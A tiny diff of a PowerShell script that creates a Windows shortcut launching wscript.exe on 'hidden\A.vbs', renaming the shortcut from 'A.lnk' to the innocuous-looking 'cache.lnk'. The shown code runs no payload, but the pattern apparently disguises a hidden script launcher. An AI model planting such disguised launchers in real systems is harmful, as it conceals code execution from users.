@@ -1,5 +1,5 @@
 $WshShell = New-Object -ComObject WScript.Shell
-$shortcut = $WshShell.CreateShortcut("A.lnk")
+$shortcut = $WshShell.CreateShortcut("cache.lnk")
 $shortcut.TargetPath = "wscript.exe"
 $shortcut.Arguments = "hidden\A.vbs"
 $shortcut.WorkingDirectory = ".\"
